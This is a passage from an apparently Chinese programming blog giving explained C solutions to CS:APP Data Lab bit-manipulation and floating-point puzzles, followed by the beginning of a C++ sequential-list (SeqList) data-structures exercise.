<li>当<code>x</code>的低<code>n</code>位全部为0时，<code>~x</code>运算后的低<code>n</code>位全部变为1，再加1即“等价于”（对较高位来说）在第<code>n</code>位加1（整体加上<code>1 &lt;&lt; n</code>），故<code>~x + 1</code>的<strong>第<code>n</code>位至第31位</strong>（认为最低位为第0位，下同）与<code>~x + (1 &lt;&lt; n))</code>的相同。则<code>~((~x + 1) &gt;&gt; n) + 1 = ~((~x + (1 &lt;&lt; n)) &gt;&gt; n) + 1 = ~(~x &gt;&gt; n + 1) + 1</code>，此即<code>~x &gt;&gt; n + 1</code>的相反数。而<code>~(~x &gt;&gt; n) + 1</code>为<code>~x &gt;&gt; n</code>的相反数，即满足<code>~(~x &gt;&gt; n) + 1 + ~x &gt;&gt; n = 0</code>，故所求<code>~x &gt;&gt; n + 1</code>的相反数为<code>~(~x &gt;&gt; n)</code>，即<code>x &gt;&gt; n</code>。</li>
<li>当<code>x</code>的低<code>n</code>位不全为0时，即至少某一位为1，<code>~x</code>运算后该位变成0，其他位为1，再加1后的进位一定进到了最低的0上，而不会影响到较高位。故<code>~x + 1</code>的<strong>第<code>n</code>位至第31位</strong>与<code>~x</code>的相同。则<code>~((~x + 1) &gt;&gt; n) + 1 = ~(~x &gt;&gt; n) + 1 = (x &gt;&gt; n) + 1</code>。</li>
</ul>
<p>可以看出，当<code>x</code>为负数时，只有低<code>n</code>位不全为0时才需要加1。</p>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> divpwr2(<span class="built_in">int</span> x, <span class="built_in">int</span> <span class="built_in">n</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">int</span> sig = !!(x &gt;&gt; <span class="number">31</span>);</span><br><span class="line">    <span class="built_in">int</span> msk = (<span class="number">1</span> &lt;&lt; <span class="built_in">n</span>) + ~<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">int</span> xLowN = msk &amp; x;</span><br><span class="line">    return (x &gt;&gt; <span class="built_in">n</span>) + ((!!xLowN) &amp; sig);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Puzzle-6-bitCount"><a href="#Puzzle-6-bitCount" class="headerlink" title="Puzzle 6 - bitCount"></a>Puzzle 6 - bitCount</h1><blockquote>
<p>bitCount - returns count of number of 1’s in word<br>Examples: bitCount(5) = 2, bitCount(7) = 3<br>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;<br>Max ops: 40<br>Rating: 4</p>
</blockquote>
<p>查找“1”一共有多少位，首先可能想到按照每一位进行查找，但此时运算符总数会超出上限。所以我们可以把参数<code>x</code>划分为8部分，用“模版”<code>0001 0001 0001 0001 0001 0001 0001 0001</code>来比较，并比较4次。</p>
<p>获得模版的方法同<code>Puzzle 2</code>。</p>
<p>设比较的结果为<code>sum</code>，比较完成之后可以发现，我们已经把参数<code>x</code>的8部分中各自“1”的总数存放在了<code>sum</code>对应的$1/8$部分中，然后将这8部分进行3次“对折”，即可将8部分各自总数加到一起。</p>
<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line">int bitCount(int x)</span><br><span class="line">&#123;</span><br><span class="line">    int msk, <span class="built_in">sum</span>;</span><br><span class="line"></span><br><span class="line">    msk = <span class="number">0x11</span> | <span class="type">(0x11</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    msk = msk | <span class="type">(msk</span> &lt;&lt; <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sum</span> = x &amp; msk;</span><br><span class="line">    <span class="built_in">sum</span> += (x &gt;&gt; <span class="number">1</span>) &amp; msk;</span><br><span class="line">    <span class="built_in">sum</span> += (x &gt;&gt; <span class="number">2</span>) &amp; msk;</span><br><span class="line">    <span class="built_in">sum</span> += (x &gt;&gt; <span class="number">3</span>) &amp; msk;</span><br><span class="line"></span><br><span class="line">    msk = <span class="number">0xff</span> | <span class="type">(0xff</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">sum</span> = (<span class="built_in">sum</span> &gt;&gt; <span class="number">16</span>) + (<span class="built_in">sum</span> &amp; msk);</span><br><span class="line"></span><br><span class="line">    msk = <span class="number">0xf</span> | <span class="type">(0xf</span> &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">sum</span> = ((<span class="built_in">sum</span> &gt;&gt; <span class="number">4</span>) &amp; msk) + (<span class="built_in">sum</span> &amp; msk);</span><br><span class="line"></span><br><span class="line">    msk = <span class="number">0xff</span>;</span><br><span class="line">    <span class="built_in">sum</span> = (<span class="built_in">sum</span> &amp; msk) + (<span class="built_in">sum</span> &gt;&gt; <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Puzzle-…"><a href="#Puzzle-…" class="headerlink" title="Puzzle …"></a>Puzzle …</h1><p>同时也要注意代码的规范问题，利用辅助工具可以协助提高代码的质量。</p>
<p>例如，运行<code>./btest</code>以检查函数功能的正确性：<br><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/btest.png" alt="btest检测"><br>运行<code>./dlc -e bits.c</code>以检查每个函数的运算符使用情况：<br><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/dlc.png" alt="dlc检测"><br>运行<code>./driver.pl</code>以同时输出<code>dlc</code>和<code>BDD checker</code>的结果：<br><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/driver.png" alt="driver检测"></p>
]]></content>
      <tags>
        <tag>Computer Systems</tag>
        <tag>Lab Assignments</tag>
      </tags>
  </entry>
  <entry>
    <title>简单又复杂的位级运算（续集）</title>
    <url>/Data-Lab-2/</url>
    <content><![CDATA[<p>Data Lab: Manipulating Bits #2 - 对于实验一（Data Lab）的一些想法（下）。</p>
<a id="more"></a>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<blockquote>
<p>这个实验要求学生实现简单的逻辑和算术运算函数，但是只能使用一个非常有限的C语言子集。比如，只能用位级操作来计算一个数字的绝对值。这个实验可帮助学生了解 C语言数据类型的位级表示，以及数据操作的位级行为。</p>
</blockquote>
<h1 id="Puzzle-1-conditional"><a href="#Puzzle-1-conditional" class="headerlink" title="Puzzle 1 - conditional"></a>Puzzle 1 - conditional</h1><blockquote>
<p>conditional - same as x ? y : z<br>Example: conditional(2,4,5) = 4<br>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;<br>Max ops: 16<br>Rating: 3</p>
</blockquote>
<p>利用位操作来实现三目运算符表达式<code>x ? y : z</code>的功能，只需判断<code>x</code>是否为<code>0</code>：若不为<code>0</code>则返回<code>y</code>；反之则返回<code>z</code>。</p>
<p>同样可以利用算术右移的特点制作一个<strong>掩码（mask）</strong>，类似<a href="https://www.superpung.xyz/2020/04/02/Data-Lab-1/">#1</a>中提到的“模版”，以便于操作。</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> msk = (!!x) &lt;&lt; <span class="number">31</span> &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    <span class="keyword">return</span> (msk &amp; y) | (~msk &amp; z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Puzzle-2-isNonNegative"><a href="#Puzzle-2-isNonNegative" class="headerlink" title="Puzzle 2 - isNonNegative"></a>Puzzle 2 - isNonNegative</h1><blockquote>
<p>isNonNegative - return 1 if x &gt;= 0, return 0 otherwise<br>Example: isNonNegative(-1) = 0.  isNonNegative(0) = 1.<br>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;<br>Max ops: 6<br>Rating: 3</p>
</blockquote>
<p>判断符号位即可。</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isNonNegative</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !(x &gt;&gt; <span class="number">31</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Puzzle-3-isGreater"><a href="#Puzzle-3-isGreater" class="headerlink" title="Puzzle 3 - isGreater"></a>Puzzle 3 - isGreater</h1><blockquote>
<p>isGreater - if x &gt; y  then return 1, else return 0<br>Example: isGreater(4,5) = 0, isGreater(5,4) = 1<br>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;<br>Max ops: 24<br> Rating: 3</p>
</blockquote>
<p>比较大小，显然当<code>x</code>为正且<code>y</code>为负时，一定有<code>x &gt; y</code>成立；当<code>x</code>为负且<code>y</code>为正时，上式一定不成立。</p>
<p>当<code>x</code>与<code>y</code>同号时，判断二者之差是否为正即可。注意题目要求，当二者相等时返回<code>0</code>，故此处作差时减<code>1</code>。</p>
<p>判断正负依然利用符号位。</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> isGreater(<span class="keyword">int</span> <span class="keyword">x</span>, <span class="keyword">int</span> <span class="keyword">y</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> _x, _y, <span class="function"><span class="keyword">sub</span></span>;</span><br><span class="line">    _x = <span class="keyword">x</span> &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    _y = <span class="keyword">y</span> &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    <span class="function"><span class="keyword">sub</span> = (<span class="title">x</span> + ~<span class="title">y</span>) &gt;&gt; 31</span>;</span><br><span class="line">    <span class="keyword">return</span> (!_x &amp; _y) | (!(_x ^ _y) &amp; !<span class="function"><span class="keyword">sub</span>)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Puzzle-4-absVal"><a href="#Puzzle-4-absVal" class="headerlink" title="Puzzle 4 - absVal"></a>Puzzle 4 - absVal</h1><blockquote>
<p>absVal - absolute value of x<br>Example: absVal(-1) = 1.<br>You may assume -TMax &lt;= x &lt;= TMax<br>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;<br>Max ops: 10<br>Rating: 4</p>
</blockquote>
<p>正数的绝对值为其本身，负数的绝对值为其相反数。</p>
<p>位全0取反为-1（<code>~0 + 1 = 0</code>），全1取反为0。</p>
<p>依然可以利用符号位右移作为掩码，当<code>x</code>为正时掩码全0，异或后仍为原值；当<code>x</code>为负时掩码全1，异或后相当于取反的效果，再加1即得到其相反数。</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">absVal</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> _x = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">    <span class="keyword">return</span> (x ^ _x) + (~_x + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Puzzle-5-isPower2"><a href="#Puzzle-5-isPower2" class="headerlink" title="Puzzle 5 - isPower2"></a>Puzzle 5 - isPower2</h1><blockquote>
<p>isPower2 - returns 1 if x is a power of 2, and 0 otherwise<br>Examples: isPower2(5) = 0, isPower2(8) = 1, isPower2(0) = 0<br>Note that no negative number is a power of 2.<br>Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;<br>Max ops: 20<br>Rating: 4</p>
</blockquote>
<p>一个数为2的幂次，即其二进制位有且仅有1位为1。</p>
<p>不妨设其中1所在最低位为第<code>n</code>位，则减1后其<code>0～n-1</code>位均变为1，而第<code>n</code>位变为0——<code>0～n</code>为与原值相反，<code>n</code>位以上与原值相同。此时将减1后的值与原值取与，可知取与结果的低<code>n+1</code>位必为0。若原值在<code>n</code>位以上仍存在1，则取与结果必不为0，由上段推论知，此时原值必不为2的幂次。若原值在<code>n</code>位以上全0，则取与结果必为0，此时原值必为2的幂次。</p>
<p>显然非正值必不为2的幂次。</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">int isPower2(int <span class="meta">x</span>)</span><br><span class="line">&#123;</span><br><span class="line">    int msk = <span class="meta">x</span> + ~0;</span><br><span class="line">    <span class="meta">return</span> !(<span class="meta">x</span> &amp; msk) &amp; !(<span class="meta">x</span> &gt;&gt; 31) &amp; !!<span class="meta">x</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Puzzle-6-float-neg"><a href="#Puzzle-6-float-neg" class="headerlink" title="Puzzle 6 - float_neg"></a>Puzzle 6 - float_neg</h1><blockquote>
<p>float_neg - Return bit-level equivalent of expression -f for floating point argument f. Both the argument and result are passed as unsigned int’s, but they are to be interpreted as the bit-level representations of single-precision floating point values.<br>When argument is NaN, return argument.<br>Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while<br>Max ops: 10<br>Rating: 2</p>
</blockquote>
<p>本题需要对浮点数的构成有基本的了解，鉴于下题需要对浮点数有极为全面的认识，此处建议提前阅读<a href="https://www.superpung.xyz/2020/04/10/IEEE754-float/">IEEE754与单精度浮点数</a>，注意文章中对<code>NaN</code>的定义并思考相反数的求法。</p>
<p>0x7fffffff = 0111 1111 1111 1111 1111 1111 1111 1111<br>0x7f800000 = 0111 1111 1000 0000 0000 0000 0000 0000<br>0x80000000 = 1000 0000 0000 0000 0000 0000 0000 0000</p>
<p>本题只需判断参数<code>uf</code>是否为<code>NaN</code>，是则返回其本身，否则返回其相反数。</p>
<p>制作低<code>31</code>位全1的掩码，同原值取与以保留参数<code>uf</code>除去符号位的值，取与结果同0x7f800000相比可判断原值是否为<code>NaN</code>。</p>
<p>求相反数只需变换符号位，同掩码0x80000000异或即可。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">float_neg</span><span class="params">(<span class="keyword">unsigned</span> uf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> msk = <span class="number">0x7fffffff</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> low = uf &amp; msk;</span><br><span class="line">    <span class="keyword">if</span> (low &gt; <span class="number">0x7f800000</span>)</span><br><span class="line">        <span class="keyword">return</span> uf;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        msk = <span class="number">0x80000000</span>;</span><br><span class="line">        <span class="keyword">return</span> uf ^ msk;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Puzzle-7-float-i2f"><a href="#Puzzle-7-float-i2f" class="headerlink" title="Puzzle 7 - float_i2f"></a>Puzzle 7 - float_i2f</h1><blockquote>
<p>float_i2f - Return bit-level equivalent of expression (float) x<br>Result is returned as unsigned int, but it is to be interpreted as the bit-level representation of a single-precision floating point values.<br>Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while<br>Max ops: 30<br>Rating: 4</p>
</blockquote>
<p>本题需将<code>int</code>型参数<code>x</code>转化为单精度浮点数<code>float</code>型数值，即实现类型转换<code>(float)x</code>的功能。如果你对浮点数没有基本的了解，可能会认为<code>int</code>型<code>x</code>是整数，转化为<code>float</code>型就不存在小数了。为避免类似一些误解，需要对浮点数有极为全面的认识，此处建议<span id = "IEEE754">提前阅读</span><a href="https://www.superpung.xyz/2020/04/10/IEEE754-float/">IEEE754与单精度浮点数</a>。</p>
<p>整数转化为浮点数，首先将整数的二进制编码转化为科学计数法$m\times 2^{e}$的形式，其中$m$的小数部分便对应浮点数的<code>fraction</code>位，$e$对应浮点数的<code>exponent</code>位，符号位互相对应。例如$78=1001110_{2}=1.00111\times 2^{6}_{2}$，故<code>sign</code>位为0，<code>exponent</code>位为$6+127=133=100 00101_{2}$，<code>fraction</code>位为$001 1100 0000 0000 0000 0000$。</p>
<p>由于浮点数由<code>sign</code>、<code>exponent</code>、<code>fraction</code>三部分组成，可以分三部分来进行转换。</p>
<h2 id="Declare-Variables"><a href="#Declare-Variables" class="headerlink" title="Declare Variables"></a>Declare Variables</h2><p><code>sig</code>、<code>exp</code>、<code>frc</code>分别代表浮点数的三部分；<code>frcMsk</code>为<code>fraction</code>位全1的掩码，用于存放<code>fraction</code>位；<code>eBit</code>指向<code>x</code>中1的最高位。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">int</span> sig = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line"><span class="attribute">int</span> exp, frc;</span><br><span class="line"><span class="attribute">int</span> frcMsk = <span class="number">0</span>x<span class="number">7</span>fffff;</span><br><span class="line"><span class="attribute">int</span> eBit = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<h2 id="Judge-Special-Value"><a href="#Judge-Special-Value" class="headerlink" title="Judge Special Value"></a>Judge Special Value</h2><p>特殊值只需返回特定值。</p>
<p>当<code>x</code>的值为0x80000000时，即$-2^{31}$，是有符号<code>int</code>型最小值。为避免操作可能导致的溢出错误，此处直接返回其<code>float</code>值，即<code>exponent</code>部分为$31+127=158$，其他位均为0。</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line"><span class="meta">if</span> (<span class="meta">x</span> == 0)</span><br><span class="line">    <span class="meta">return</span> <span class="meta">x</span>;</span><br><span class="line"><span class="meta">else</span> <span class="meta">if</span> (<span class="meta">x</span> == 0x80000000)</span><br><span class="line">    <span class="meta">return</span> 0xcf000000;</span><br></pre></td></tr></table></figure>
<h2 id="Judge-Sign"><a href="#Judge-Sign" class="headerlink" title="Judge Sign"></a>Judge Sign</h2><p>负数转化为其相反数进行运算。</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">if (sig)</span><br><span class="line">    <span class="keyword">x</span> <span class="operator">=</span> -<span class="keyword">x</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>
<h2 id="Get-Exponent-Bits"><a href="#Get-Exponent-Bits" class="headerlink" title="Get Exponent Bits"></a>Get Exponent Bits</h2><p>当右移<code>eBit</code>位后为0，而右移<code>eBit-1</code>位不为0时，说明<code>eBit-1</code>位1所在最高位。例如$78=1001110_{2}$，右移<code>6</code>位不为0，而右移<code>7</code>位为0，故1所在最高位为第<code>6</code>位。</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (x &gt;&gt; eBit)</span><br><span class="line">    eBit++;</span><br><span class="line"><span class="built_in">exp</span> = <span class="comment">--eBit + 127;</span></span><br></pre></td></tr></table></figure>
<h2 id="Get-Fraction-Bits"><a href="#Get-Fraction-Bits" class="headerlink" title="Get Fraction Bits"></a>Get Fraction Bits</h2><p>左移<code>31-eBit</code>位，将1所在最高位移动到第<code>31</code>位。当<code>x</code>为$78=1001110_{2}$时，移动后即$$78=1001 1100 0000 0000 0000 0000 0000 0000_{2}.$$再右移到fraction的位最高位后$$0000 0000 1001 1100 0000 0000 0000 0000$$同掩码$$0000 0000 0111 1111 1111 1111 1111 1111$$取与，即可得到<code>fraction</code>位。</p>
<p>至于为什么将最高位的1舍弃，请<a href="#IEEE754">返回</a>并继续阅读。</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">x</span> = x &lt;&lt; (<span class="number">31</span> - eBit)<span class="comment">;</span></span><br><span class="line"><span class="attr">frc</span> = (x &gt;&gt; <span class="number">8</span>) &amp; frcMsk<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<h2 id="Round-to-Even"><a href="#Round-to-Even" class="headerlink" title="Round to Even"></a>Round to Even</h2><p>上面的<code>fraction</code>是将<code>x</code>右移<code>8</code>位后取得的，应该考虑被移出去的<code>8</code>位是否满足进位的条件，若符合应该进行进位。</p>
<p>先取<code>x</code>的低<code>8</code>位，若大于一半或者等于一半，应该进位。注意此处进位为向<strong>偶数</strong>进位，即若等于一半且被进位的位置为0时不进位。</p>
<p>进位之后<code>fraction</code>位会出现变化，若超出<code>23</code>位长，应向<code>exponent</code>进位，且进位后<code>fraction</code>与掩码取与重置。</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">x <span class="meta">&amp;= 0xff;</span></span><br><span class="line">if ((x &gt; <span class="number">0</span>x80) <span class="string">|| ((x == 0x80) &amp;&amp; (frc &amp; 1)))</span></span><br><span class="line">    frc++;</span><br><span class="line">if (frc &gt;&gt; <span class="number">23</span>) &#123;</span><br><span class="line">    <span class="built_in">exp</span>++;</span><br><span class="line">    frc <span class="meta">&amp;= frcMsk;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Return-Result"><a href="#Return-Result" class="headerlink" title="Return Result"></a>Return Result</h2><p>将各部分左移到相应位置取或即可。</p>
<figure class="highlight coq"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> (sig &lt;&lt; <span class="number">31</span>) | <span class="type">(exp</span> &lt;&lt; <span class="number">23</span>) | <span class="type">frc</span>;</span><br></pre></td></tr></table></figure>
<h2 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h2><figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">unsigned float_i2f(int <span class="meta">x</span>)</span><br><span class="line">&#123;</span><br><span class="line">    int sig = (<span class="meta">x</span> &gt;&gt; 31) &amp; 1;</span><br><span class="line">    int exp, frc;</span><br><span class="line">    int frcMsk = 0x7fffff;</span><br><span class="line">    int eBit = 1;</span><br><span class="line"></span><br><span class="line">    <span class="meta">if</span> (<span class="meta">x</span> == 0)</span><br><span class="line">        <span class="meta">return</span> <span class="meta">x</span>;</span><br><span class="line">    <span class="meta">else</span> <span class="meta">if</span> (<span class="meta">x</span> == 0x80000000)</span><br><span class="line">        <span class="meta">return</span> 0xcf000000;</span><br><span class="line">    <span class="meta">else</span> &#123;</span><br><span class="line">        <span class="meta">if</span> (sig)</span><br><span class="line">            <span class="meta">x</span> = -<span class="meta">x</span>;</span><br><span class="line"></span><br><span class="line">        <span class="meta">while</span> (<span class="meta">x</span> &gt;&gt; eBit)</span><br><span class="line">            eBit++;</span><br><span class="line">        exp = --eBit + 127;</span><br><span class="line"></span><br><span class="line">        <span class="meta">x</span> = <span class="meta">x</span> &lt;&lt; (31 - eBit);</span><br><span class="line">        frc = (<span class="meta">x</span> &gt;&gt; 8) &amp; frcMsk;</span><br><span class="line">        <span class="meta">x</span> &amp;= 0xff;</span><br><span class="line">        <span class="meta">if</span> ((<span class="meta">x</span> &gt; 0x80) || ((<span class="meta">x</span> == 0x80) <span class="variable">&amp;&amp;</span> (frc &amp; 1)))</span><br><span class="line">            frc++;</span><br><span class="line">        <span class="meta">if</span> (frc &gt;&gt; 23) &#123;</span><br><span class="line">            exp++;</span><br><span class="line">            frc &amp;= frcMsk;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">return</span> (sig &lt;&lt; 31) | (exp &lt;&lt; 23) | frc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Puzzle-…"><a href="#Puzzle-…" class="headerlink" title="Puzzle …"></a>Puzzle …</h1><p>同时也要注意代码的规范问题，利用辅助工具可以协助提高代码的质量。</p>
<p>例如，运行<code>./btest</code>以检查函数功能的正确性：<br><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/btest2.png" alt="btest2"><br>运行<code>./dlc -e bits.c</code>以检查每个函数的运算符使用情况：<br><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/dlc2.png" alt="dlc2"><br>运行<code>./driver.pl</code>以同时输出<code>dlc</code>和<code>BDD checker</code>的结果：<br><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/driver2.png" alt="driver2"></p>
]]></content>
      <tags>
        <tag>Computer Systems</tag>
        <tag>Lab Assignments</tag>
      </tags>
  </entry>
  <entry>
    <title>还不会操作「顺序表」？</title>
    <url>/Data-Structures-Experiment-1/</url>
    <content><![CDATA[<p>Data Structures Experiment #1 - 搭建实验环境，并实现顺序表的基本操作</p>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<blockquote>
<p>实现一个SeqList类。</p>
<ul>
<li><code>SeqList(const int&amp; listSize);</code><br>构造函数，构建一个<code>SeqList</code>，其中<code>listSize</code>为顺序表最多存放元素的个数。</li>
<li><code>bool isIn(const int&amp; data);</code><br>判断<code>data</code>是否在顺序表中。如果<code>data</code>在顺序表中，返回<code>true</code>，否则返回<code>false</code>。</li>
<li><code>int length();</code><br>返回顺序中加入元素的个数。</li>
<li><code>int getData(const int&amp; location);</code><br>返回位置为<code>location</code>的元素。</li>
<li><code>bool insert(const int&amp; data, const int&amp; location);</code><br>将<code>data</code>插入<code>location</code>中，其中如果顺序表已经满了，则返回<code>false</code>。其中<code>location</code>的计数从<code>0</code>开始，并且测试时会保证<code>location</code> 小于等于元素的个数。</li>
<li><code>bool remove(const int&amp; location);</code><br>删除位置为<code>location</code>的元素，如果<code>location</code>不合法，则返回<code>false</code>。删除成功则返回<code>true</code>。</li>
<li><code>～SeqList();</code><br>析构函数。</li>
</ul>
</blockquote>
<h1 id="0x01-构造函数"><a href="#0x01-构造函数" class="headerlink" title="0x01 构造函数"></a>0x01 构造函数</h1><p>直接分配<code>LIST_SIZE</code>大小的空间。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">SeqList::SeqList(<span class="keyword">const</span> <span class="keyword">int</span>&amp; listSize) :LIST_SIZE(listSize)</span><br><span class="line">&#123;</span><br><span class="line">    seq = <span class="keyword">new</span> <span class="keyword">int</span>[LIST_SIZE];</span><br><span class="line">    <span class="comment">// equal to:  seq = (int*) malloc(sizeof(int) * LIST_SIZE);</span></span><br><span class="line">    len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x02-isIn"><a href="#0x02-isIn" class="headerlink" title="0x02 isIn"></a>0x02 isIn</h1><p>默认为元素不在表中，顺序遍历即可。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">SeqList::isIn</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span>&amp; data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> defaultOut = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (data == seq[i])</span><br><span class="line">        &#123;</span><br><span class="line">            defaultOut = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">if</span> (defaultOut)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x03-length"><a href="#0x03-length" class="headerlink" title="0x03 length"></a>0x03 length</h1><p>直接返回长度。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SeqList::length</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x04-getData"><a href="#0x04-getData" class="headerlink" title="0x04 getData"></a>0x04 getData</h1><p>返回对应位置的数值。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SeqList::getData</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span>&amp; location)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> seq[location];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x05-insert"><a href="#0x05-insert" class="headerlink" title="0x05 insert"></a>0x05 insert</h1><p>将该位置后元素整体后移，插入即可。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">SeqList::insert</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span>&amp; data, <span class="keyword">const</span> <span class="keyword">int</span>&amp; location)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (len == LIST_SIZE)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = len - <span class="number">1</span>; i &gt;= location; i--)</span><br><span class="line">            seq[i + <span class="number">1</span>] = seq[i];</span><br><span class="line">        seq[location] = data;</span><br><span class="line">        len++;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x06-remove"><a href="#0x06-remove" class="headerlink" title="0x06 remove"></a>0x06 remove</h1><p>首先判断位置的合法性。</p>
<p>将该位置后元素整体前移，删除即可。</p>
